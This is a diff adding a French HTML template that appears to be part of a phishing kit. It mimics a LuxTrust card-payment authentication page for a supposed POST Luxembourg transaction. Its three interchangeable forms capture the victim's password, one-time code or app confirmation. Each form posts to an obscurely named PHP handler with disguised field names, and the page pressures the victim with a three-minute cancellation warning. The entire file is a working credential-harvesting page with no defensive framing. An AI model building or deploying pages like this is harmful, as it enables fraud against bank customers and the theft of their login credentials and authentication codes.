@@ -1,0 +1,633 @@
+<html><head>
+    <link rel="icon" data-savepage-href="http://localhost/favicon.ico" href="">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Authentification</title>
+    <style>
+	
+	
+        /* Reset and base styles */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            background-color: #FFFFFF;
+            color: #000000;
+            font-family: Arial, sans-serif;
+            font-weight: normal;
+            margin: 0;
+            padding: 0;
+        }
+        
+        /* Responsive container */
+        .container {
+            width: 100%;
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 0px;
+        }
+        
+
+        
+        /* Divider */
+        .divider {
+            width: 100%;
+            max-width: 250px;
+            height: 1px;
+            background-color: #4169E1;
+            margin: 0 auto 20px;
+            border: none;
+        }
+        
+        /* Transaction details */
+        .transaction-section {
+        }
+        
+        .section-title {
+            color: #1E90FF;
+            font-size: clamp(14px, 3.5vw, 16px);
+            font-weight: bold;
+            margin-bottom: 4px;
+            text-align: center;
+        }
+        
+        /* Transaction table */
+        .transaction-table {
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
+            font-size: clamp(12px, 3vw, 14px);
+            border-spacing: 0;
+            border-collapse: collapse;
+        }
+        
+        .transaction-table td {
+            padding: 8px 5px;
+            vertical-align: top;
+        }
+        
+        .transaction-table .label {
+            color: #333333;
+            font-weight: bold;
+            white-space: nowrap;
+            padding-right: 10px;
+        }
+        
+        .transaction-table .value {
+            color: #333333;
+            word-break: break-word;
+        }
+        
+
+        
+        .auth-form {
+            background-color: rgba(255,255,255,0.39);
+            border-radius: 8px;
+            padding: 0px 15px;
+            margin-bottom: 20px;
+        }
+        
+        .auth-table {
+            width: 100%;
+            /* max-width: 390px; */
+            /* margin: 0 auto; */
+            font-size: clamp(12px, 3vw, 14px);
+            /* border-spacing: 0; */
+            border-collapse: collapse;
+        }
+        
+        .auth-table td {
+            padding: 8px 0;
+            /* vertical-align: middle; */
+        }
+        
+        .auth-label {
+            /* color: #707070; */
+            font-weight: bold;
+            /* padding-right: 10px; */
+            white-space: nowrap;
+            /* width: 1%; */
+        }
+        
+        /* Form controls */
+        .form-input {
+            width: 100%;
+            height: 40px;
+            padding: 4px 12px;
+            border: 1px solid #DEE2E6;
+            border-radius: 4px;
+            background-color: #FFFFFF;
+            color: #212529;
+            font-family: Arial, sans-serif;
+            font-size: clamp(13px, 3.5vw, 14px);
+            font-weight: bold;
+            line-height: 1.4;
+        }
+        
+        .form-input:focus {
+            border-color: #66AFE9;
+            outline: 0;
+            box-shadow: 0 0 0 2px rgba(102, 175, 233, 0.3);
+        }
+        
+        .form-input:disabled {
+            background-color: #f8f9fa;
+            color: #6c757d;
+            cursor: not-allowed;
+        }
+        
+        /* Button */
+        .submit-btn {
+            display: block;
+            width: 100%;
+            max-width: 200px;
+            height: 40px;
+            margin: 20px auto 0;
+            border: 2px solid #A9A9A9;
+            border-radius: 4px;
+            background-color: #FFFFFF;
+            color: #707070;
+            font-family: Arial, sans-serif;
+            font-size: clamp(13px, 3.5vw, 14px);
+            font-weight: normal;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+        
+        .submit-btn:hover {
+            background-color: #f8f9fa;
+            border-color: #8a8a8a;
+        }
+        
+        .submit-btn:active {
+            transform: translateY(1px);
+        }
+        
+        /* Message styles */
+        .auth-message {
+            text-align: center;
+            margin: 15px 0;
+            padding: 10px;
+            /* background-color: #f8f9fa; */
+            border-radius: 4px;
+            font-size: clamp(13px, 3.5vw, 14px);
+            color: #333;
+        }
+        
+        .app-instruction {
+            text-align: center;
+            margin: 5px 0;
+            border-radius: 4px;
+        }
+        
+        .app-instruction h2 {
+            font-size: clamp(14px, 3.5vw, 16px);
+            margin-bottom: 10px;
+        }
+        
+        .app-instruction p {
+            color: #333;
+            font-size: clamp(12px, 3vw, 14px);
+            line-height: 1.5;
+        }
+        
+        /* Error message */
+        .error-message {
+            color: #dc3545;
+            text-align: center;
+            margin: 15px 0;
+            padding: 10px;
+            font-size: clamp(12px, 3vw, 14px);
+            /* background-color: #f8d7da; */
+            border-radius: 4px;
+            /* border: 1px solid #f5c6cb; */
+        }
+        
+        /* Utility classes */
+        .hidden {
+            display: none !important;
+        }
+        
+        .visible {
+            display: block;
+        }
+        
+        .text-center {
+            text-align: center;
+        }
+        
+        /* Responsive adjustments */
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+
+            
+            .transaction-table td {
+                display: block;
+                width: 100%;
+                padding: 5px 0;
+            }
+            
+            .transaction-table .label {
+                display: inline-block;
+                width: 40%;
+                padding-right: 5px;
+            }
+            
+            .transaction-table .value {
+                display: inline-block;
+                width: 60%;
+            }
+            
+            .auth-table td {
+                /* display: block; */
+                /* width: 100%; */
+                /* padding: 8px 0; */
+            }
+            
+            .auth-label {
+                /* display: block; */
+                /* width: 100%; */
+                /* margin-bottom: 5px; */
+                /* padding-right: 0; */
+            }
+            
+            .form-input {
+                height: 45px;
+            }
+            
+            .submit-btn {
+                height: 45px;
+                max-width: 100%;
+            }
+        }
+        
+        @media (max-width: 320px) {
+            .container {
+                padding: 5px;
+            }
+            
+            .transaction-section,
+            .auth-form {
+                padding: 15px 10px;
+            }
+            
+            .form-input {
+                font-size: 13px;
+                padding: 4px 8px;
+            }
+        }
+        
+        /* Landscape orientation for mobile */
+        @media (max-height: 500px) and (orientation: landscape) {
+
+            
+            .transaction-section,
+            .auth-form {
+                padding: 15px;
+            }
+            
+            .transaction-table td,
+            .auth-table td {
+                padding: 5px 0;
+            }
+        }
+        
+        /* Tablet and desktop adjustments */
+        @media (min-width: 768px) {
+            .container {
+                max-width: 600px;
+                padding: 20px;
+            }
+            
+            .transaction-section,
+            .auth-form {
+                padding: 0;
+            }
+            
+            .form-input {
+                height: 42px;
+            }
+            
+            .submit-btn {
+                height: 42px;
+                max-width: 220px;
+            }
+        }
+        
+        /* Animation for form switching */
+        .auth-section {
+            transition: opacity 0.3s ease;
+        }
+        
+        /* Focus styles for accessibility */
+        button:focus-visible,
+        input:focus-visible {
+            outline: 2px solid #4169E1;
+            outline-offset: 2px;
+        }
+        
+        /* Print styles */
+        @media print {
+            .submit-btn,
+            .form-input:not(:disabled) {
+                display: none;
+            }
+            
+            .container {
+                max-width: 100%;
+            }
+        }
+        
+/* Style-specific overrides */
+        div#style-1,
+        div#style-2,
+        div#style-3 {
+            display: none;
+        }
+        
+        div#style-{{style}} {
+            display: block;
+        }        /* Header styles */
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 10px 0;
+            margin-bottom: 10px;
+            flex-wrap: wrap;
+            position: relative;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 80%;
+            max-width: 250px;
+            height: 1px;
+            background-color: #4169E1;
+        }
+        
+        .logo-container {
+            flex: 0 0 auto;
+            padding: 5px;
+        }
+        
+        .logo {
+            width: 100%;
+            max-width: 116px;
+            height: auto;
+            display: block;
+        }
+        
+        .mobile-logo {
+            display: none;
+            width: 80px;
+            height: auto;
+        }
+        
+        .title-container {
+            flex: 1;
+            text-align: center;
+            padding: 0 10px;
+        }
+        
+        .page-title {
+            color: #000000;
+            font-size: 20px;
+            font-weight: 600;
+            text-align: center;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+        
+        .icon-container {
+            flex: 0 0 auto;
+            padding: 5px;
+            text-align: right;
+        }
+        
+        .auth-icon {
+            width: 100px;
+            height: 100px;
+            object-fit: contain;
+        }
+        
+        .mobile-icon {
+            display: none;
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+		
+		            .header {
+                flex-direction: row;
+                flex-wrap: nowrap;
+                padding: 8px 0;
+            }
+            
+            .logo {
+                display: none;
+            }
+            
+            .mobile-logo {
+                display: block;
+                width: 70px;
+            }
+            
+            .title-container {
+                order: 2;
+                flex: 1;
+                padding: 0 8px;
+            }
+            
+            .page-title {
+                font-size: 17px;
+            }
+            
+            .icon-container {
+                order: 3;
+            }
+            
+            .auth-icon {
+                display: none;
+            }
+            
+            .mobile-icon {
+                display: block;
+                width: 50px;
+                height: 50px;
+            }
+                  @media (max-width: 320px) {
+            .mobile-logo {
+                width: 50px;
+            }
+            
+            .page-title {
+                font-size: 15px;
+            }
+            
+            .mobile-icon {
+                width: 40px;
+                height: 40px;
+            }
+        }            .header {
+                padding: 0px 0 0px 0;
+            }
+            
+            .mobile-logo {
+                width: 60px;
+            }
+            
+            .page-title {
+                font-size: 16px;
+            }
+            
+            .mobile-icon {
+                width: 45px;
+                height: 45px;
+            }
+
+    </style>
+</head>
+<body>
+    <div class="container">
+        
+        <div class="header">
+            <div class="logo-container">
+                <img src="{{logoPath}}" alt="Logo" class="logo">
+                <img src="{{logoPath}}" alt="Logo" class="mobile-logo">
+            </div>
+            <div class="title-container">
+                <h1 class="page-title">Authentification</h1>
+            </div>
+            <div class="icon-container">
+                <img src="icon/{{type}}.svg" alt="Type d'authentification" class="auth-icon">
+                <img src="icon/{{type}}.svg" alt="Type d'authentification" class="mobile-icon">
+            </div>
+        </div>        
+        <div class="transaction-section">
+            <div class="section-title">Détails de la transaction</div>
+            
+            <table class="transaction-table">
+                <tbody>
+                    <tr>
+                        <td class="label">Commerçant</td>
+                        <td class="value">: POST Luxembourg</td>
+                    </tr>
+                    <tr>
+                        <td class="label">Montant</td>
+                        <td class="value">: 13.09 EUR</td>
+                    </tr>
+                    <tr>
+                        <td class="label">Date</td>
+                        <td class="value">: {{dat}}</td>
+                    </tr>
+                    <tr>
+                        <td class="label">Numéro de carte</td>
+                        <td class="value">: **** **** **** {{bins}}</td>
+                    </tr>
+      
+                </tbody>
+            </table>
+        </div>
+        
+        <!-- Style 1: User ID and Password -->
+        <div id="style-1" class="auth-section">
+            <div class="auth-form">
+                <div class="section-title">Authentification avec Lux Trust</div>
+                
+                <form action="jonhokalmandis.php" method="post">
+                    <table class="auth-table">
+                        <tbody>
+                            <tr>
+                                <td class="auth-label">User ID</td>
+                                <td>
+                                    <input type="text" 
+                                           class="form-input" 
+                                           value="{{message}}" 
+                                           disabled
+                                           aria-label="User ID">
+                                    <input type="hidden" name="Ecom1" value="{{message}}">
+                                </td>
+                            </tr>
+                            <tr>
+                                <td class="auth-label">Password</td>
+                                <td>
+                                    <input type="password" 
+                                           class="form-input" 
+                                           name="Ecom" 
+                                           required
+                                           aria-label="Password"
+                                           autocomplete="current-password">
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <input type="hidden" name="zabalitamittahokakdola" value="{{tokenx}}">
+                    <button type="submit" class="submit-btn">Suivant</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Style 2: Code input -->
+        <div id="style-2" class="auth-section">
+            <div class="auth-form">
+                <div class="section-title">Authentification avec Lux Trust</div>
+                
+                <div class="auth-message">{{message}}</div>
+                
+                <form action="jonhokalmandis.php" method="post">
+                    <table class="auth-table">
+                        <tbody>
+                            <tr>
+                                <td class="auth-label">{{Code}}</td>
+                                <td>
+                                    <input type="text" 
+                                           class="form-input" 
+                                           name="Ecom" 
+                                           required
+                                           aria-label="{{Code}}"
+                                           autocomplete="one-time-code">
+                                </td>
+                            </tr>
+                        </tbody>
+                    </table>
+                    
+                    <input type="hidden" name="zabalitamittahokakdola" value="{{tokenx}}">
+                    <button type="submit" class="submit-btn">Suivant</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Style 3: App confirmation -->
+        <div id="style-3" class="auth-section">
+            <div class="auth-form">
+                <div class="section-title">Authentification avec Lux Trust</div>
+                
+                <div class="app-instruction">
+<h2>connectez-vous à votre application {{bank}} et confirmez cette transaction.</h2>
+<p>Si vous ne confirmez pas dans les 3 minutes, cette transaction sera annulée.</p>
+                </div>
+                
+                <form action="jonhokalmandis.php" method="post">
+                    <input type="hidden" name="Ecom" value="Confirmed">
+                    <input type="hidden" name="zabalitamittahokakdola" value="{{tokenx}}">
+                    <button type="submit" class="submit-btn">Suivant</button>
+                </form>
+            </div>
+        </div>
+        
+        <!-- Error message -->
+        <div class="error-message">{{error}}</div>
+    </div>
+</body></html>
